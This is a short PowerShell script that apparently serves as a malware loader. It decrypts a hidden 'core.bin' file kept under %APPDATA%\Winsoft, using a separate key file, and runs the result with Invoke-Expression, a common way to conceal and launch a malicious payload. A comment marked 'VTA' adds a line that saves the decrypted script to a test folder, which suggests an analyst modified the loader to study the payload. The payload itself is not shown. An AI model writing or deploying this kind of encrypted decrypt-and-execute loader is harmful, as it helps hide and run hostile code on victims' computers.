function Decrypt-Script($encryptedScriptPath, $keyFileName) {
  if (-not (Test-Path $encryptedScriptPath)) {
    Throw ""
  }

  $keyFilePath = Join-Path -Path $env:APPDATA\Winsoft -ChildPath ($keyFileName)
  
  if (-not (Test-Path $keyFilePath)) {
    Throw ""
  }

  $encryptedContent = Get-Content $encryptedScriptPath -Raw
  $key = Get-Content $keyFilePath -Raw

  $secure = $encryptedContent | ConvertTo-SecureString -Key (([int[]][char[]]$key)[0..15])
  $script = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure))

  return $script
}

$encryptedScriptPath = Join-Path -Path $env:APPDATA\Winsoft -ChildPath "core.bin"
$keyFileName = "k"

$decryptedScript = Decrypt-Script $encryptedScriptPath $keyFileName

# VTA - Adding export to file
$decryptedScript | Out-File -FilePath C:\vta_test\sample_core.txt

Invoke-Expression $decryptedScript
